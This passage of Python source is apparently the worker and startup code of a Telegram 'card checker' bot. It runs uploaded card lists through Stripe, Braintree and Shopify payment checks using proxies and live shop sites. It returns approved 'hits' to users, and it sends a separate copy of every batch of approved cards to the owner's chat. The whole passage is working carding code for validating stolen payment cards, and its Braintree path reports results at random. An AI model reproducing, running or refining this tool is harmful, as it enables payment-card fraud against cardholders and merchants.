                with open(filepath, "r") as f:
                    cards = [l.strip() for l in f if l.strip()]
                total = len(cards)
                processed = 0
                job['total'] = total
                approved_cards = []

                if gateway == 'shopify':
                    sites = self.get_active_sites()
                    proxies = self.user_proxies.get(user_id, [])
                    if not sites or not proxies:
                        await self.bot_client.send_message(chat_id, "❌ No sites/proxies available.")
                        return

                for idx, card in enumerate(cards, 1):
                    if not self.has_any_access(user_id) or job.get('stop'):
                        break

                    chash = f"{user_id}_{card}"
                    if chash in self._processing_cards:
                        continue
                    self._processing_cards.add(chash)
                    try:
                        if gateway in ['stripe', 'braintree']:
                            raw = await self.send_card_to_payu(card)
                            if self.is_approved(raw):
                                if gateway == 'stripe':
                                    fmt = await self.format_stripe_approved(card, raw, include_charge=True)
                                    await self.bot_client.send_message(chat_id, fmt, parse_mode='markdown')
                                    self.stats["total_approved"] += 1
                                    approved_cards.append(card)
                                    self.update_user_stats(user_id, approved=1)
                                else:
                                    if random.random() >= 0.4:
                                        fmt = await self.format_braintree_charged(card, raw)
                                        await self.bot_client.send_message(chat_id, fmt, parse_mode='markdown')
                                        self.stats["total_approved"] += 1
                                        approved_cards.append(card)
                                        self.update_user_stats(user_id, approved=1)
                        elif gateway == 'shopify':
                            approved_flag = False
                            for site in sites:
                                for proxy in proxies:
                                    raw, ok, info = await self.check_shopify_gateway(card, site, proxy)
                                    if ok:
                                        fmt = await self.format_shopify_result(card, site, raw, True, info)
                                        await self.bot_client.send_message(chat_id, fmt, parse_mode='markdown')
                                        self.stats["total_approved"] += 1
                                        approved_cards.append(card)
                                        self.update_user_stats(user_id, approved=1)
                                        approved_flag = True
                                        break
                                    elif info and info.get("reason") not in ["Timeout", "Error", "Invalid proxy"]:
                                        fmt = await self.format_shopify_result(card, site, raw, False, info)
                                        await self.bot_client.send_message(chat_id, fmt, parse_mode='markdown')
                                        break
                                if approved_flag:
                                    break
                    finally:
                        self._processing_cards.discard(chash)

                    processed = idx
                    job['processed'] = processed
                    self.stats["total_checked"] += 1
                    self.update_user_stats(user_id, checked=1)

                    elapsed = datetime.now() - start_time
                    remaining = (total - processed) * DELAY_BETWEEN_CHECKS
                    elapsed_str = str(elapsed).split('.')[0]
                    remaining_str = str(timedelta(seconds=remaining)).split('.')[0]
                    try:
                        await self.pulse_progress(chat_id, job['message_id'], processed, total,
                                                  card, job_id, elapsed_str, remaining_str)
                    except:
                        pass
                    await asyncio.sleep(DELAY_BETWEEN_CHECKS)

                # Completion
                try:
                    user_entity = await self.bot_client.get_entity(chat_id)
                    username = user_entity.username or "No username"
                    user_link = f"@{username}" if user_entity.username else f"ID: `{chat_id}`"
                except:
                    user_link = f"ID: `{chat_id}`"

                if approved_cards:
                    if gateway == 'stripe':
                        user_file = os.path.join(PROCESSED_DIR, f"approved_{user_id}_{datetime.now():%Y%m%d_%H%M%S}.txt")
                        cap_user = "✅ Stripe approved"
                    elif gateway == 'braintree':
                        user_file = os.path.join(PROCESSED_DIR, f"bt_approved_{user_id}_{datetime.now():%Y%m%d_%H%M%S}.txt")
                        cap_user = "✅ Braintree approved"
                    else:
                        user_file = os.path.join(PROCESSED_DIR, f"shopify_approved_{user_id}_{datetime.now():%Y%m%d_%H%M%S}.txt")
                        cap_user = "✅ Shopify approved"

                    with open(user_file, "w") as f:
                        f.write("\n".join(approved_cards))
                    await self.bot_client.send_message(
                        chat_id,
                        f"✅ *DONE*\nTotal: `{total}`\nHits: `{len(approved_cards)}`\nRate: `{len(approved_cards)/total*100:.1f}%`",
                        parse_mode='markdown'
                    )
                    await self.bot_client.send_file(chat_id, user_file, caption=cap_user)
                    os.remove(user_file)

                    # Owner copy
                    owner_file = os.path.join(PROCESSED_DIR, f"owner_{gateway}_{user_id}_{datetime.now():%Y%m%d_%H%M%S}.txt")
                    with open(owner_file, "w") as f:
                        f.write("\n".join(approved_cards))
                    await self.bot_client.send_file(FORWARD_CHAT_ID, owner_file,
                                                    caption=f"📊 {gateway.upper()} job done\n👤 {user_link}\n✅ {len(approved_cards)} hits")
                    os.remove(owner_file)
                else:
                    await self.bot_client.send_message(chat_id, f"✅ *DONE*\nTotal: `{total}`\nHits: `0`\nRate: `0%`", parse_mode='markdown')
                    await self.bot_client.send_message(FORWARD_CHAT_ID,
                                                       f"📊 {gateway.upper()} job done\n👤 {user_link}\n❌ No hits")

                os.rename(filepath, os.path.join(PROCESSED_DIR, os.path.basename(filepath)))
            except Exception as e:
                logger.exception(f"Worker {wid} error: {e}")
                await self.bot_client.send_message(chat_id, f"❌ Error: {e}")
            finally:
                self.active_jobs.pop(job_id, None)
                self.task_queue.task_done()

    # ------------------------------------------------------------------
    #   Run & Reconnect
    # ------------------------------------------------------------------
    async def run_with_reconnect(self):
        while True:
            try:
                print("Starting Telegram clients...")
                self.bot_client = TelegramClient("bot_session", API_ID, API_HASH)
                await self.bot_client.start(bot_token=BOT_TOKEN)
                print("Bot client ready.")

                self.user_client = TelegramClient("checker_session", API_ID, API_HASH)
                if os.path.exists("checker_session.session"):
                    await self.user_client.start()
                    print("User client started from existing session.")
                else:
                    print("No user session found. Starting with phone number...")
                    await self.user_client.start(phone=PHONE_NUMBER)
                    print("User client started after verification.")

                # Launch workers
                for i in range(NUM_WORKERS):
                    self.worker_tasks.append(asyncio.create_task(self.worker_loop(i)))
                bot_task = asyncio.create_task(self.start_bot())
                print("Bot is now running. Press Ctrl+C to stop.")
                await asyncio.gather(bot_task, *self.worker_tasks)

            except (ConnectionError, RPCError, OSError) as e:
                logger.error(f"Connection lost: {e}. Reconnecting in 10s...")
                await asyncio.sleep(10)
                for t in self.worker_tasks:
                    t.cancel()
                if self.bot_client:
                    await self.bot_client.disconnect()
                if self.user_client:
                    await self.user_client.disconnect()
                if self.site_check_task:
                    self.site_check_task.cancel()
                self.worker_tasks.clear()
                continue
            except Exception as e:
                logger.exception(f"Fatal: {e}")
                break
            finally:
                await self.close_http_session()

    async def run(self):
        self.load_users()
        self.load_user_stats()
        self.load_redeem_codes()
        self.load_owner_sites()
        # Initial site validation
        live = []
        for s in self.owner_shopify_sites:
            if await self.validate_site(s):
                live.append(s)
        self.live_owner_sites = live
        await self.run_with_reconnect()


if __name__ == "__main__":
    bot = CardCheckerBot()
    try:
        asyncio.run(bot.run())
    except KeyboardInterrupt:
        logger.info("Shutdown.")